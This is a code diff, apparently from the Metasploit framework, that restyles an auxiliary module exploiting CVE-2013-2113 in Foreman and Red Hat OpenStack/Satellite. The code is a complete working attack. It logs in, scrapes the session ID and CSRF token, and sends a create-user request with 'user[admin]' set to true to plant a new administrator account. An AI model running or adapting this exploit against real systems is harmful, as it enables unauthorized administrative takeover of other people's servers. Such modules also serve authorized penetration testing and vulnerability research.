@@ -1,36 +1,37 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
 
   def initialize
     super(
-      'Name'           => 'Foreman (Red Hat OpenStack/Satellite) users/create Mass Assignment',
-      'Description'    => %q{
+      'Name' => 'Foreman (Red Hat OpenStack/Satellite) users/create Mass Assignment',
+      'Description' => %q{
           This module exploits a mass assignment vulnerability in the 'create'
         action of 'users' controller of Foreman and Red Hat OpenStack/Satellite
         (Foreman 1.2.0-RC1 and earlier) by creating an arbitrary administrator
         account. For this exploit to work, your account must have 'create_users'
         permission (e.g., Manager role).
       },
-      'Author'         => 'Ramon de C Valle',
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
-          ['BID', '60835'],
-          ['CVE', '2013-2113'],
-          ['CWE', '915'],
-          ['OSVDB', '94655'],
-          ['URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=966804'],
-          ['URL', 'http://projects.theforeman.org/issues/2630']
-        ],
-      'DisclosureDate' => 'Jun 6 2013'
+      'Author' => 'Ramon de C Valle',
+      'License' => MSF_LICENSE,
+      'References' => [
+        ['BID', '60835'],
+        ['CVE', '2013-2113'],
+        ['CWE', '915'],
+        ['OSVDB', '94655'],
+        ['URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=966804'],
+        ['URL', 'https://projects.theforeman.org/issues/2630']
+      ],
+      'DisclosureDate' => 'Jun 6 2013',
+      'Notes' => {
+        'Stability' => [CRASH_SAFE],
+        'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES],
+        'Reliability' => []
+      }
     )
 
     register_options(
@@ -43,17 +44,17 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('NEWPASSWORD', [true, 'The password of the new admin account']),
         OptString.new('NEWEMAIL', [true, 'The email of the new admin account']),
         OptString.new('TARGETURI', [ true, 'The path to the application', '/']),
-      ], self.class
+      ]
     )
   end
 
   def run
     print_status("Logging into #{target_url}...")
     res = send_request_cgi(
-      'method'    => 'POST',
-      'uri'       => normalize_uri(target_uri.path, 'users', 'login'),
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'users', 'login'),
       'vars_post' => {
-        'login[login]'    => datastore['USERNAME'],
+        'login[login]' => datastore['USERNAME'],
         'login[password]' => datastore['PASSWORD']
       }
     )
@@ -63,11 +64,11 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    if res.headers['Location'] =~ /users\/login$/
+    if res.headers['Location'] =~ %r{users/login$}
       print_error('Authentication failed')
       return
     else
-      session = $1 if res.get_cookies =~ /_session_id=([0-9a-f]*)/
+      session = ::Regexp.last_match(1) if res.get_cookies =~ /_session_id=([0-9a-f]*)/
 
       if session.nil?
         print_error('Failed to retrieve the current session id')
@@ -79,7 +80,7 @@ class MetasploitModule < Msf::Auxiliary
     res = send_request_cgi(
       'cookie' => "_session_id=#{session}",
       'method' => 'GET',
-      'uri'    => normalize_uri(target_uri)
+      'uri' => normalize_uri(target_uri)
     )
 
     if res.nil?
@@ -87,36 +88,36 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    if res.headers['Location'] =~ /users\/login$/
+    if res.headers['Location'] =~ %r{users/login$}
       print_error('Failed to retrieve the CSRF token')
       return
-    else
-      csrf_param = $1 if res.body =~ /<meta[ ]+content="(.*)"[ ]+name="csrf-param"[ ]*\/?>/i
-      csrf_token = $1 if res.body =~ /<meta[ ]+content="(.*)"[ ]+name="csrf-token"[ ]*\/?>/i
+    end
 
-      if csrf_param.nil? || csrf_token.nil?
-        csrf_param = $1 if res.body =~ /<meta[ ]+name="csrf-param"[ ]+content="(.*)"[ ]*\/?>/i
-        csrf_token = $1 if res.body =~ /<meta[ ]+name="csrf-token"[ ]+content="(.*)"[ ]*\/?>/i
-      end
+    csrf_param = ::Regexp.last_match(1) if res.body =~ %r{<meta +content="(.*)" +name="csrf-param" */?>}i
+    csrf_token = ::Regexp.last_match(1) if res.body =~ %r{<meta +content="(.*)" +name="csrf-token" */?>}i
 
-      if csrf_param.nil? || csrf_token.nil?
-        print_error('Failed to retrieve the CSRF token')
-        return
-      end
+    if csrf_param.nil? || csrf_token.nil?
+      csrf_param = ::Regexp.last_match(1) if res.body =~ %r{<meta +name="csrf-param" +content="(.*)" */?>}i
+      csrf_token = ::Regexp.last_match(1) if res.body =~ %r{<meta +name="csrf-token" +content="(.*)" */?>}i
+    end
+
+    if csrf_param.nil? || csrf_token.nil?
+      print_error('Failed to retrieve the CSRF token')
+      return
     end
 
     print_status("Sending create-user request to #{target_url('users')}...")
     res = send_request_cgi(
-      'cookie'    => "_session_id=#{session}",
-      'method'    => 'POST',
-      'uri'       => normalize_uri(target_uri.path, 'users'),
+      'cookie' => "_session_id=#{session}",
+      'method' => 'POST',
+      'uri' => normalize_uri(target_uri.path, 'users'),
       'vars_post' => {
-        csrf_param                    => csrf_token,
-        'user[admin]'                 => 'true',
-        'user[auth_source_id]'        => '1',
-        'user[login]'                 => datastore['NEWUSERNAME'],
-        'user[mail]'                  => datastore['NEWEMAIL'],
-        'user[password]'              => datastore['NEWPASSWORD'],
+        csrf_param => csrf_token,
+        'user[admin]' => 'true',
+        'user[auth_source_id]' => '1',
+        'user[login]' => datastore['NEWUSERNAME'],
+        'user[mail]' => datastore['NEWEMAIL'],
+        'user[password]' => datastore['NEWPASSWORD'],
         'user[password_confirmation]' => datastore['NEWPASSWORD']
       }
     )
